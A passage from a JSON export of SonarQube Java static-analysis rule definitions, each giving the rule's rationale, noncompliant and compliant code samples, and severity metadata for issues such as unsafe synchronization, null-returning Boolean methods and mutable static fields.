<code>true</code> or <code>false</code>. </li>\n</ul>\n<pre>\nif (true) {\n  // do something\n}\n</pre>\n<p>In these cases it is obvious the code is as intended.</p>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/570\">CWE-570 - Expression is Always False</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/571\">CWE-571 - Expression is Always True</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/5dUxBQ\">CERT, MSC12-C.</a> - Detect and remove code that has no effect or is never executed\n  </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2583","summary":"Conditionally executed code should be reachable","tags":["cwe","cert","unused","suspicious","pitfall","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Non-encoded control characters and whitespace characters are often injected in the source code because of a bad manipulation. They are either\ninvisible or difficult to recognize, which can result in bugs when the string is not what the developer expects. If you actually need to use a control\ncharacter use their encoded version (ex: ASCII <code>\\n,\\t,</code>â¦â or Unicode <code>U+000D, U+0009,</code>â¦â).</p>\n<p>This rule raises an issue when the following characters are seen in a literal string:</p>\n<ul>\n  <li> <a href=\"https://en.wikipedia.org/wiki/ASCII#Control_characters\">ASCII control character</a>. (character index &lt; 32 or = 127) </li>\n  <li> Unicode <a href=\"https://en.wikipedia.org/wiki/Unicode_character_property#Whitespace\">whitespace characters</a>. </li>\n  <li> Unicode <a href=\"https://en.wikipedia.org/wiki/C0_and_C1_control_codes\">C0 control characters</a> </li>\n  <li> Unicode characters <code>U+200B, U+200C, U+200D, U+2060, U+FEFF, U+2028, U+2029</code> </li>\n</ul>\n<p>No issue will be raised on the simple space character. Unicode <code>U+0020</code>, ASCII 32.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nString tabInside = \"A\tB\";  // Noncompliant, contains a tabulation\nString zeroWidthSpaceInside = \"fooâbar\"; // Noncompliant, it contains a U+200B character inside\nchar tab = '\t';\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nString tabInside = \"A\\tB\";  // Compliant, uses escaped value\nString zeroWidthSpaceInside = \"foo\\u200Bbar\";  // Compliant, uses escaped value\nchar tab = '\\t';\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2479","summary":"Whitespace and control characters in literals should be explicit","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Callers of a <code>Boolean</code> method may be expecting to receive <code>true</code> or <code>false</code> in response. But <code>Boolean</code>\nobjects can take <code>null</code> as a possible value. <code>Boolean</code> methods should not return <code>null</code> unless the code is annotated\nappropriately. With the proper annotation, the caller is aware that the returned value could be null.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic Boolean isUsable() {\n  // ...\n  return null;  // Noncompliant\n}\n\npublic void caller() {\n  if (isUsable()) { // A NullPointerException might occur here\n    // ...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@javax.annotation.Nullable\npublic Boolean isUsable() {\n  // ...\n  return null;\n}\n\n@javax.annotation.CheckForNull\npublic Boolean isUsable() {\n  // ...\n  return null;\n}\n\npublic void caller() {\n  if (Boolean.True.equals(isUsable())) { // This caller knows to check and avoid ambiguity\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/476\">CWE-476 - NULL Pointer Dereference</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/aDdGBQ\">CERT, EXP01-J.</a> - Do not use a null in a case where an object is required </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2447","summary":"\"null\" should not be returned from a \"Boolean\" method","tags":["cwe","cert","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>notify</code> and <code>notifyAll</code> both wake up sleeping threads waiting on the objectâs monitor, but <code>notify</code> only wakes up\none single thread, while <code>notifyAll</code> wakes them all up. Unless you do not care which specific thread is woken up, <code>notifyAll</code>\nshould be used instead.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nclass MyThread implements Runnable {\n  Object lock = new Object();\n\n  @Override\n  public void run() {\n    synchronized(lock) {\n      // ...\n      lock.notify();  // Noncompliant\n    }\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nclass MyThread implements Runnable {\n  Object lock = new Object();\n\n  @Override\n  public void run() {\n    synchronized(lock) {\n      // ...\n      lock.notifyAll();\n    }\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/MTdGBQ\">CERT, THI02-J.</a> - Notify all waiting threads rather than a single thread </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"covered","ruleKey":"RSPEC-2446","summary":"\"notifyAll()\" should be preferred over \"notify()\"","tags":["multi-threading","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Synchronizing on a class field synchronizes not on the field itself, but on the object assigned to it. So synchronizing on a non-<code>final</code>\nfield makes it possible for the fieldâs value to change while a thread is in a block synchronized on the old value. That would allow a second thread,\nsynchronized on the new value, to enter the block at the same time.</p>\n<p>The story is very similar for synchronizing on parameters; two different threads running the method in parallel could pass two different object\ninstances in to the method as parameters, completely undermining the synchronization.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nprivate String color = \"red\";\n\nprivate void doSomething(){\n  synchronized(color) {  // Noncompliant; lock is actually on object instance \"red\" referred to by the color variable\n    //...\n    color = \"green\"; // other threads now allowed into this block\n    // ...\n  }\n  synchronized(new Object()) { // Noncompliant this is a no-op.\n     // ...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nprivate String color = \"red\";\nprivate final Object lockObj = new Object();\n\nprivate void doSomething(){\n  synchronized(lockObj) {\n    //...\n    color = \"green\";\n    // ...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/412\">CWE-412 - Unrestricted Externally Accessible Lock</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/413\">CWE-413 - Improper Resource Locking</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/djdGBQ\">CERT, LCK00-J.</a> - Use private final lock objects to synchronize classes that may\n  interact with untrusted code </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2445","summary":"Blocks should be synchronized on \"private final\" fields","tags":["cwe","multi-threading","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>In a multi-threaded situation, un-<code>synchronized</code> lazy initialization of static fields could mean that a second thread has access to a\nhalf-initialized object while the first thread is still creating it. Allowing such access could cause serious bugs. Instead. the initialization block\nshould be <code>synchronized</code>.</p>\n<p>Similarly, updates of such fields should also be <code>synchronized</code>.</p>\n<p>This rule raises an issue whenever a lazy static initialization is done on a class with at least one <code>synchronized</code> method, indicating\nintended usage in multi-threaded applications.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nprivate static Properties fPreferences = null;\n\nprivate static Properties getPreferences() {\n        if (fPreferences == null) {\n            fPreferences = new Properties(); // Noncompliant\n            fPreferences.put(\"loading\", \"true\");\n            fPreferences.put(\"filterstack\", \"true\");\n            readPreferences();\n        }\n        return fPreferences;\n    }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nprivate static Properties fPreferences = null;\n\nprivate static synchronized Properties getPreferences() {\n        if (fPreferences == null) {\n            fPreferences = new Properties();\n            fPreferences.put(\"loading\", \"true\");\n            fPreferences.put(\"filterstack\", \"true\");\n            readPreferences();\n        }\n        return fPreferences;\n    }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2444","summary":"Lazy initialization of \"static\" fields should be \"synchronized\"","tags":["multi-threading"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>java.util.concurrent.locks.Lock</code> offers far more powerful and flexible locking operations than are available with\n<code>synchronized</code> blocks. So synchronizing on a <code>Lock</code> instance throws away the power of the object, as it overrides its better\nlocking mechanisms. Instead, such objects should be locked and unlocked using one of their <code>lock</code> and <code>unlock</code> method\nvariants.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\nLock lock = new MyLockImpl();\nsynchronized(lock) {  // Noncompliant\n  // ...\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\nLock lock = new MyLockImpl();\nif (lock.tryLock()) {\n  try {\n    // ...\n  } finally {\n    lock.unlock();\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/qjdGBQ\">CERT, LCK03-J.</a> - Do not synchronize on the intrinsic locks of high-level concurrency\n  objects </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2442","summary":"Synchronizing on a \"Lock\" object should be avoided","tags":["multi-threading","cert","clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>HttpSession</code> s are managed by web servers and can be serialized and stored on disk as the server manages its memory use in a process\ncalled \"passivation\" (and later restored during \"activation\").</p>\n<p>Even though <code>HttpSession</code> does not extend <code>Serializable</code>, you must nonetheless assume that it will be serialized. If\nnon-serializable objects are stored in the session, serialization might fail.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Address {\n  //...\n}\n\nHttpSession session = request.getSession();\nsession.setAttribute(\"address\", new Address());  // Noncompliant; Address isn't serializable\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Address implements Serializable {\n  //...\n}\n\nHttpSession session = request.getSession();\nsession.setAttribute(\"address\", new Address());\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/579\">CWE-579 - J2EE Bad Practices: Non-serializable Object Stored in Session</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2441","summary":"Non-serializable objects should not be stored in \"javax.servlet.http.HttpSession\" instances","tags":["cwe"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>static</code> methods can be accessed without an instance of the enclosing class, so thereâs no reason to instantiate a class that has only\n<code>static</code> methods.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class TextUtils {\n  public static String stripHtml(String source) {\n    return source.replaceAll(\"&lt;[^&gt;]+&gt;\", \"\");\n  }\n}\n\npublic class TextManipulator {\n\n  // ...\n\n  public void cleanText(String source) {\n    TextUtils textUtils = new TextUtils(); // Noncompliant\n\n    String stripped = textUtils.stripHtml(source);\n\n    //...\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class TextUtils {\n  public static String stripHtml(String source) {\n    return source.replaceAll(\"&lt;[^&gt;]+&gt;\", \"\");\n  }\n}\n\npublic class TextManipulator {\n\n  // ...\n\n  public void cleanText(String source) {\n    String stripped = TextUtils.stripHtml(source);\n\n    //...\n  }\n}\n</pre>\n<h2>Resources</h2>\n<h3>Related rules</h3>\n<ul>\n  <li> {rule:java:S1118} - Utility classes should not have public constructors </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2440","summary":"Classes with only \"static\" methods should not be instantiated","tags":["clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The semantics of <code>Thread</code> and <code>Runnable</code> are different, and while it is technically correct to use <code>Thread</code> where\na <code>Runnable</code> is expected, it is a bad practice to do so.</p>\n<p>The crux of the issue is that <code>Thread</code> is a larger concept than <code>Runnable</code>. A <code>Runnable</code> represents a task. A\n<code>Thread</code> represents a task and its execution management (ie: how it should behave when started, stopped, resumed, â¦â). It is both a task\nand a lifecycle management.</p>\n<h3>Noncompliant code example</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic static void main(String[] args) {\n\tThread runnable = new Thread() {\n\t\t@Override\n\t\tpublic void run() { /* ... */ }\n\t};\n\tnew Thread(runnable).start();  // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic static void main(String[] args) {\n\tRunnable runnable = new Runnable() {\n\t\t@Override\n\t\tpublic void run() { /* ... */ }\n\t};\n\tnew Thread(runnable).start();\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2438","summary":"\"Thread\" should not be used where a \"Runnable\" argument is expected","tags":["multi-threading","pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Certain bit operations are just silly and should not be performed because their results are predictable.</p>\n<p>Specifically, using <code>&amp; -1</code> with any value will always result in the original value, as will <code>anyValue ^ 0</code> and\n<code>anyValue | 0</code>.</p>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2437","summary":"Unnecessary bit operations should not be performed","tags":["suspicious"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"LOGICAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Referencing a static member of a subclass from its parent during class initialization, makes the code more fragile and prone to future bugs. The\nexecution of the program will rely heavily on the order of initialization of classes and their static members.</p>\n<h3>What is the potential impact?</h3>\n<p>This could create what is known as an \"initialization cycle\", or even a deadlock in some extreme cases. Additionally, if the order of the static\nclass members is changed, the behavior of the program might change. These issues can be very hard to diagnose so it is highly recommended to avoid\ncreating this kind of dependencies.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nclass Parent {\n  static int field1 = Child.method(); // Noncompliant\n  static int field2 = 42;\n\n  public static void main(String[] args) {\n    System.out.println(Parent.field1); // will display \"0\" instead of \"42\"\n  }\n}\n\nclass Child extends Parent {\n  static int method() {\n    return Parent.field2;\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CERT - <a href=\"https://wiki.sei.cmu.edu/confluence/display/java/DCL00-J.+Prevent+class+initialization+cycles\">DCL00-J. Prevent class\n  initialization cycles</a> </li>\n  <li> <a href=\"https://docs.oracle.com/javase/specs/jls/se17/html/jls-12.html#jls-12.4\">Section 12.4: Initialization of Classes and Interfaces</a> -\n  Java Language Specification </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2390","summary":"Classes should not access their own subclasses during class initialization","tags":["cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"MODULAR","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>An inner class that extends another type can call methods from both the outer class and parent type directly, without prepending\n<code>super.</code> or <code>Outer.this.</code>.</p>\n<p>When both the outer and parent classes contain a method with the same name, the compiler will resolve an unqualified call to the parent typeâs\nimplementation. The maintainer or a future reader may confuse the method call as calling the outer classâs implementation, even though it really calls\nthe super typeâs.</p>\n<p>To make matters worse, the maintainer sees the outer classâs implementation in the same file as the call in the inner class, while the parent type\nis often declared in another file. The maintainer may not even be aware of the ambiguity present, as they do not see the parentâs implementation.</p>\n<h2>How to fix it</h2>\n<p>Explicitly call the super typeâs method by prepending <code>super.</code> to the method call. If the intention was to call the outer classâs\nimplementation, prepend <code>Outer.this.</code> instead.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\npublic class Parent {\n  public void foo() { ... }\n}\n\npublic class Outer {\n  public void foo() { ... }\n\n  public class Inner extends Parent {\n    public void doSomething() {\n      foo();  // Noncompliant, it is not explicit if Outer#foo or Parent#foo is the intended implementation to be called.\n      // ...\n    }\n  }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\npublic class Parent {\n  public void foo() { ... }\n}\n\npublic class Outer {\n  public void foo() { ... }\n\n  public class Inner extends Parent {\n    public void doSomething() {\n      super.foo(); // Compliant, it is explicit that Parent#foo is the desired implementation to be called.\n      // ...\n    }\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2388","summary":"Inner class calls to super class methods should be unambiguous","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Having a variable with the same name in two unrelated classes is fine, but do the same thing within a class hierarchy and youâll get confusion at\nbest, chaos at worst.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic class Fruit {\n  protected Season ripe;\n  protected Color flesh;\n\n  // ...\n}\n\npublic class Raspberry extends Fruit {\n  private boolean ripe;  // Noncompliant\n  private static Color FLESH; // Noncompliant\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic class Fruit {\n  protected Season ripe;\n  protected Color flesh;\n\n  // ...\n}\n\npublic class Raspberry extends Fruit {\n  private boolean ripened;\n  private static Color FLESH_COLOR;\n\n}\n</pre>\n<h3>Exceptions</h3>\n<p>This rule ignores same-name fields that are <code>static</code> in both the parent and child classes. This rule ignores <code>private</code> parent\nclass fields, but in all other such cases, the child class field should be renamed.</p>\n<pre>\npublic class Fruit {\n  private Season ripe;\n  // ...\n}\n\npublic class Raspberry extends Fruit {\n  private Season ripe;  // Compliant as parent field 'ripe' is anyway not visible from Raspberry\n  // ...\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2387","summary":"Child class fields should not shadow parent class fields","tags":["confusing"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>There is no good reason to have a mutable object as the <code>public</code> (by default), <code>static</code> member of an <code>interface</code>.\nSuch variables should be moved into classes and their visibility lowered.</p>\n<p>Similarly, mutable <code>static</code> members of classes and enumerations which are accessed directly, rather than through getters and setters,\nshould be protected to the degree possible. That can be done by reducing visibility or making the field <code>final</code> if appropriate.</p>\n<p>Note that making a mutable field, such as an array, <code>final</code> will keep the variable from being reassigned, but doing so has no effect on\nthe mutability of the internal state of the array (i.e. it doesnât accomplish the goal).</p>\n<p>This rule raises issues for <code>public static</code> array, <code>Collection</code>, <code>Date</code>, and <code>awt.Point</code> members.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic interface MyInterface {\n  public static String [] strings; // Noncompliant\n}\n\npublic class A {\n  public static String [] strings1 = {\"first\",\"second\"};  // Noncompliant\n  public static String [] strings2 = {\"first\",\"second\"};  // Noncompliant\n  public static List&lt;String&gt; strings3 = new ArrayList&lt;&gt;();  // Noncompliant\n  // ...\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/582\">CWE-582 - Array Declared Public, Final, and Static</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/607\">CWE-607 - Public Static Final Field References Mutable Object</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/LjdGBQ\">CERT, OBJ01-J.</a> - Limit accessibility of fields </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/VzZGBQ\">CERT, OBJ13-J.</a> - Ensure that references to mutable objects are not exposed </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2386","summary":"Mutable fields should not be \"public static\"","tags":["cwe","unpredictable","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Mutable objects are those whose state can be changed. For instance, an array is mutable, but a String is not. Private mutable class members should\nnever be returned to a caller or accepted and stored directly. Doing so leaves you vulnerable to unexpected changes in your class state.</p>\n<p>Instead use an unmodifiable <code>Collection</code> (via <code>Collections.unmodifiableCollection</code>,\n<code>Collections.unmodifiableList</code>, â¦â) or make a copy of the mutable object, and store or return the copy instead.</p>\n<p>This rule checks that private arrays, collections and Dates are not stored or returned directly.</p>\n<h3>Exceptions</h3>\n<p>The rule violation is not reported for mutable values stored in private methods if no non-private methods directly passes a mutable parameter to\nthem.</p>\n<p>Similarly, rule violations are not reported for mutable values returned by a private getter if that getterâs value is not directly exposed by a\nnon-private method.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nclass A {\n  private String[] strings;\n\n  public A () {\n    strings = new String[]{\"first\", \"second\"};\n  }\n\n  public String[] getStrings() {\n    return strings; // Noncompliant\n  }\n\n  public void setStrings(String[] strings) {\n    this.strings = strings;  // Noncompliant\n  }\n}\n\npublic class B {\n\n  private A a = new A();  // At this point a.strings = {\"first\", \"second\"};\n\n  public void wreakHavoc() {\n    a.getStrings()[0] = \"yellow\";  // a.strings = {\"yellow\", \"second\"};\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nclass A {\n  private String [] strings;\n\n  public A () {\n    strings = new String[]{\"first\", \"second\"};\n  }\n\n  public String[] getStrings() {\n    return getStringsInternal().clone();\n  }\n\n  private String[] getStringsInternal() {\n    return strings;\n  }\n\n  private void setStringsInternal(String[] strings) {\n    this.strings = strings;\n  }\n\n  public void setStrings(String[] strings) {\n    this.strings = strings.clone();\n  }\n}\n\npublic class B {\n\n  private A a = new A();  // At this point a.strings = {\"first\", \"second\"};\n\n  public void wreakHavoc() {\n    a.getStrings()[0] = \"yellow\";  // a.strings = {\"first\", \"second\"};\n  }\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/374\">CWE-374 - Passing Mutable Objects to an Untrusted Method</a> </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/375\">CWE-375 - Returning a Mutable Object to an Untrusted Caller</a> </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/OTdGBQ\">CERT, OBJ05-J.</a> - Do not return references to private mutable class members </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/HTdGBQ\">CERT, OBJ06-J.</a> - Defensively copy mutable inputs and mutable internal components\n  </li>\n  <li> <a href=\"https://wiki.sei.cmu.edu/confluence/x/VzZGBQ\">CERT, OBJ13-J.</a> - Ensure that references to mutable objects are not exposed </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2384","summary":"Private mutable members should not be stored or returned directly","tags":["cwe","unpredictable","cert"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>The methods declared in an <code>interface</code> are <code>public</code> and <code>abstract</code> by default. Any variables are automatically\n<code>public static final</code>. Finally, <code>class</code> and <code>interface</code> are automatically <code>public static</code>. There is no\nneed to explicitly declare them so.</p>\n<p>Since annotations are implicitly interfaces, the same holds true for them as well.</p>\n<p>Similarly, the <code>final</code> modifier is redundant on any method of a <code>final</code> class, <code>private</code> is redundant on the\nconstructor of an <code>Enum</code>, and <code>static</code> is redundant for <code>interface</code> nested into a <code>class</code> or\n<code>enum</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\npublic interface Vehicle {\n\n  public void go(int speed, Direction direction);  // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\npublic interface Vehicle {\n\n  void go(int speed, Direction direction);\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-2333","summary":"Redundant modifiers should not be used","tags":["finding","clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Type parameters that arenât used are dead code, which can only distract and possibly confuse developers during maintenance. Therefore, unused type\nparameters should be removed.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nint &lt;T&gt; Add(int a, int b) // Noncompliant; &lt;T&gt; is ignored\n{\n  return a + b;\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nint Add(int a, int b)\n{\n  return a + b;\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-2326","summary":"Unused type parameters should be removed","tags":["unused"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>Non-overridable methods (<code>private</code> or <code>final</code>) that donât access instance data can be <code>static</code> to prevent any\nmisunderstanding about the contract of the method.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nclass Utilities {\n  private static String magicWord = \"magic\";\n\n  private String getMagicWord() { // Noncompliant\n    return magicWord;\n  }\n\n  private void setMagicWord(String value) { // Noncompliant\n    magicWord = value;\n  }\n\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nclass Utilities {\n  private static String magicWord = \"magic\";\n\n  private static String getMagicWord() {\n    return magicWord;\n  }\n\n  private static void setMagicWord(String value) {\n    magicWord = value;\n  }\n\n}\n</pre>\n<h3>Exceptions</h3>\n<p>When <code>java.io.Serializable</code> is implemented the following three methods are excluded by the rule:</p>\n<ul>\n  